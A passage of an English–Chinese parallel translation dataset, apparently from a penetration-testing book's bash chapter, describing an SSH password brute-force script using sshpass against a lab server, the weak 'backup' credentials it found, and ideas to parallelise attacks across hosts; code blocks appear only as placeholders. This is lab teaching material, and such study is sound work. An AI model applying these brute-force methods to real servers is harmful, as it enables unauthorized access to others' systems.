    any successful output ❻.'
  id: totrans-200
  prefs: []
  type: TYPE_NORMAL
  zh: 这个SSH暴力破解bash脚本的开始与我们的其他脚本非常相似：首先定义目标IP地址和端口。接下来，我们指定一组用户名 ❶ 和一个包含我们将使用的密码的文件
    ❷。在 ❸ 处，我们迭代每个用户名，并使用sshpass注入密码 ❺，我们逐行读取 ❹。我们打印任何成功的输出 ❻。
- en: NOTE
  id: totrans-201
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 注意
- en: '*For the following script to work, we need to install sshpass, a special utility
    that allows managing SSH connections in scripts. Install sshpass using the following
    command:*'
  id: totrans-202
  prefs: []
  type: TYPE_NORMAL
  zh: '*为了让下面的脚本工作，我们需要安装sshpass，这是一个特殊的实用工具，允许在脚本中管理SSH连接。请使用以下命令安装sshpass：*'
- en: '[PRE31]'
  id: totrans-203
  prefs: []
  type: TYPE_PRE
  zh: '[PRE31]'
- en: 'Download and run the script to see the output:'
  id: totrans-204
  prefs: []
  type: TYPE_NORMAL
  zh: 下载并运行脚本以查看输出：
- en: '[PRE32]'
  id: totrans-205
  prefs: []
  type: TYPE_PRE
  zh: '[PRE32]'
- en: 'We’ve identified that the username *backup* uses a weak password (also *backup*)
    on the *p-jumpbox-01* server. We can validate that these credentials work by using
    this command to log in to the *p-jumpbox-01* server:'
  id: totrans-206
  prefs: []
  type: TYPE_NORMAL
  zh: 我们已经发现用户名*backup*在*p-jumpbox-01*服务器上使用了一个弱密码（同样是*backup*）。你可以通过以下命令验证这些凭据是否有效，并登录到*p-jumpbox-01*服务器：
- en: '[PRE33]'
  id: totrans-207
  prefs: []
  type: TYPE_PRE
  zh: '[PRE33]'
- en: When prompted for credentials, use the password *backup*, and you should be
    granted access.
  id: totrans-208
  prefs: []
  type: TYPE_NORMAL
  zh: 当系统提示输入凭据时，使用密码*backup*，你应该能获得访问权限。
- en: 'To take this script further, attempt the following modifications:'
  id: totrans-209
  prefs: []
  type: TYPE_NORMAL
  zh: 为了进一步扩展这个脚本，尝试以下修改：
- en: Make the brute-forcing process more efficient by using a dictionary to attack
    multiple hosts in parallel so that you’re not limited to targeting a single IP
    address at a time.
  id: totrans-210
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 通过使用字典来攻击多个主机并行处理，使暴力破解过程更加高效，这样你就不再局限于一次只针对一个 IP 地址。
- en: Add a notification component to the script so that once a host is compromised,
    you’ll get a notification via your favorite messaging media.
  id: totrans-211
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 向脚本中添加一个通知组件，这样一旦主机被攻陷，你就能通过你喜欢的消息媒体收到通知。
- en: Summary
  id: totrans-212
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 概要
- en: In this chapter, you learned how to create a reverse shell on a target and uncovered
    strategies for enhancing the interactivity and longevity of your remote shell
    interfaces, laying the groundwork for future exploits. You also learned how to
    transfer files between the attacking and compromised machines. Then you used bash
    to perform an SSH brute-force attack.
  id: totrans-213
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，你学习了如何在目标机器上创建反向 shell，并探索了增强远程 shell 接口互动性和持久性的策略，为未来的攻击奠定基础。你还学习了如何在攻击机器和被攻陷的机器之间传输文件。接着，你使用
    bash 执行了 SSH 暴力破解攻击。
- en: Now that you’ve compromised three machines, we highly recommend you start roaming
    around the compromised hosts to set the stage for what’s coming in the next chapter.
  id: totrans-214
  prefs: []
  type: TYPE_NORMAL
  zh: 既然你已经攻陷了三台机器，我们强烈建议你开始在被攻陷的主机上游走，为下一章的内容做准备。
